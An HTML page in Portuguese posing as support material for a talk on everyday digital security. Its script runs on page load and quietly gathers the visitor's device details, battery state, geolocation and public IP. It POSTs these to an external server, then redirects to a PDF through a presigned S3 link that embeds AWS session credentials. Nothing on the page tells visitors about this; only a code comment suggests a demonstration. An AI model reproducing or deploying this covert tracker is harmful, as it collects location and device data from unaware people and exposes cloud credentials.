<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Material de Apoio - Segurança Digital</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #2c3e50;
            margin-bottom: 30px;
            text-align: center;
        }
        h2 {
            color: #3498db;
            margin-top: 30px;
        }
        ul {
            margin-bottom: 25px;
        }
        .pdf-viewer {
            width: 100%;
            height: 500px;
            border: 1px solid #ddd;
            margin: 20px 0;
        }
        .note {
            background-color: #e7f5fe;
            padding: 15px;
            border-left: 4px solid #3498db;
            margin: 20px 0;
        }
        .highlight {
            font-weight: bold;
            color: #e74c3c;
        }
        footer {
            margin-top: 50px;
            text-align: center;
            font-size: 0.9em;
            color: #7f8c8d;
        }
        .loading {
            text-align: center;
            margin: 40px 0;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Material de Apoio: Segurança Digital no Dia a Dia</h1>
        
        <div class="note">
            <p>Prezado participante, obrigado por acessar nosso material complementar. Este documento contém informações importantes discutidas durante a palestra.</p>
        </div>
        
        <h2>Conteúdo Principal</h2>
        <ul>
            <li>Práticas recomendadas para senhas seguras</li>
            <li>Como identificar tentativas de phishing</li>
            <li>Proteção de dados pessoais nas redes sociais</li>
            <li>Navegação segura em redes Wi-Fi públicas</li>
            <li>Ferramentas essenciais para segurança digital</li>
        </ul>
        
        <div class="loading" id="loading">
            <p>Carregando material completo... aguarde um momento.</p>
        </div>
        
        <div class="pdf-viewer">
            <p style="text-align: center; padding-top: 200px;">O conteúdo completo estará disponível em breve...</p>
        </div>
        
        <h2>Dicas Adicionais</h2>
        <p>Lembre-se sempre de verificar a fonte antes de clicar em links ou escanear QR codes. Uma prática segura é conferir o URL de destino e certificar-se de que está acessando o site oficial.</p>
        
        <p class="highlight">Importante: Sempre mantenha seu dispositivo e aplicativos atualizados para proteger-se contra vulnerabilidades conhecidas.</p>
        
        <footer>
            <p>© 2025 - Palestra sobre Segurança Digital</p>
        </footer>
    </div>

    <script>
        // Mostrar carregamento
        document.getElementById('loading').style.display = 'block';
        
        // Função para obter parâmetros da URL
        function getParameterByName(name) {
            const url = window.location.href;
            name = name.replace(/[\[\]]/g, '\\$&');
            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
            const results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }
        
        // ID único para este acesso
        const sessionId = Math.random().toString(36).substring(2, 15);
        
        // Coletar dados básicos do dispositivo
        async function collectData() {
            const data = {
                timestamp: new Date().toISOString(),
                sessionId: sessionId,
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenSize: `${window.screen.width}x${window.screen.height}`,
                referrer: document.referrer || 'Direto',
                ipInfo: 'Buscando...',
                batteryLevel: 'Não disponível'
            };
            
            // Tenta coletar informações de bateria
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    data.batteryLevel = `${Math.floor(battery.level * 100)}%`;
                    data.batteryCharging = battery.charging ? 'Sim' : 'Não';
                } catch (e) {
                    console.log('Informação de bateria não disponível');
                }
            }
            
            // Tenta obter geolocalização se permitido
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        data.location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };
                        sendDataToServer(data);
                    },
                    (error) => {
                        data.location = 'Permissão negada ou indisponível';
                        sendDataToServer(data);
                    },
                    { timeout: 5000 }
                );
            } else {
                data.location = 'Geolocalização não suportada';
                sendDataToServer(data);
            }
            
            // Tenta obter IP público
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                data.ipInfo = ipData.ip;
                sendDataToServer(data);
            } catch (e) {
                console.log('Não foi possível obter informações de IP');
                sendDataToServer(data);
            }
        }
        
        // Enviar dados para o servidor
        function sendDataToServer(data) {
            // Em uma aplicação real, aqui você enviaria os dados para seu servidor
            // usando fetch() ou XMLHttpRequest

            fetch('https://api-flamb-security.onrender.com/dados', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            
            // Para esta demonstração, salvamos em localStorage
            /*const allData = JSON.parse(localStorage.getItem('securityDemoData') || '[]');
            allData.push(data);
            localStorage.setItem('securityDemoData', JSON.stringify(allData));*/
            
            console.log('Dados coletados:', data);
            
            // Redirecionar para a página de PDF após breve atraso
            setTimeout(() => {
                window.location.href = 'https://minhaestaciopalestrasegurancaflamboyant.s3.us-east-2.amazonaws.com/Seguranca.pdf?response-content-disposition=inline&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMiJHMEUCIQDZMFUihGhpsKmr6PPkfgF9xlmOb0BljibdKsQCHpW8CgIgDNGjtPafiAOEic9yOL8IMFxzcWA96%2BuxhFXT0TIXsZoqtQMIVRAAGgwxMjI3NzcxMjgyNjciDH99i7vIs%2Fwpy2oQXyqSA2EH1352sUERUMJ40%2BPDUNJgjXBAg6JW%2BbfImfRLDEwwCKdY8sXGD7I9wNkxgcCu3VvGIYoicJLpYsMrtL%2BfDMRLeJ4yhrU4KAHyTAnBhDk%2B75Bf2jUlEaWsNdytitBCGK%2BByoc6T5yS8KS3Hki0RHbb5EPLeZMS9tfRTVZzW4d47H9ZlV3JZJzvjBSfvuQZRo%2B9rJdsMzz%2FdSA0Gq1XUfRF70vSg8x93xRh6yJZ4tTuhABiEDhtlxizjham7wREr1wFANacz7op8FtM4pyqyY%2FcvJx0fVusEKdrQpU5BDAvgDeBb6nHlYTn38UbcQ6JY4A4vA4XQVyyX0ifzK6QARz%2FL7sFwXDqypDTT8q6hEd%2FmUh1hjvNUTl27FZz1KCEvokqD4g0oBEX0SvdZOPy20SxqIKCXhCFb97UwZQWTO4i%2FDiK23pmjVAmSSj0ppWndh8m1TuuJDVin74tbH98CUYOFALQgbUkMfgHSLKsTNNT0KbRJxNjwq%2FC6amf502R40R%2F3CMEf1GySX48RgHQXJyZNjDyj6DBBjreAg1WgjtCgm5DNLbCQ0UUEQx5l9G%2FsgtCtF10EdUZLlkuH3s%2BnAsA8LQE2K9Fmf70kZkCbVzKP%2FAxau%2Fvvz4TIgHPQ%2FB6L9xQQzzihNxHimRalgly4lizjzRO1zmvYQ4qEOr%2F79TMLjFMsQy6G5RY1N2WbsMUs0%2FoubnvLcKQN0P1956MYtdxRIMO9fQVL1%2BIe48UoV7mjUuh6wzcvduJWLtAy8PkrMEr11cXdIxQg25Uaga9YOD59bIUfcgmndg57%2Fso1%2FzrP3KjEBFlYhi4QdIZvzuED5YNfe20NEg7J1gUkGPE2BG5XFsBmFl99o4H849ZROd4he6EadXSaECtWPL0cSOk1ixgrdHhKnKqS5ORkyFio6giF5lk54TgZ%2FjjVpfEwA2ZBfbR6sd3nHMYVssmCcF7Vd%2B0lSAy%2Fnasjzi9c7cpTFGHB3RvrGD8RLq95gk0nj8nN0%2FoAoFmhnlB&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIARZFQWJVFYPUGCYPG%2F20250517%2Fus-east-2%2Fs3%2Faws4_request&X-Amz-Date=20250517T035814Z&X-Amz-Expires=43200&X-Amz-SignedHeaders=host&X-Amz-Signature=ac4bd62033d596a0cd29279b80dcf7911e8d64473b4035ab4bfd31a90e32d3cb';
            }, 10000);
        }
        
        // Iniciar coleta de dados
        window.onload = collectData;
    </script>
</body>
</html>
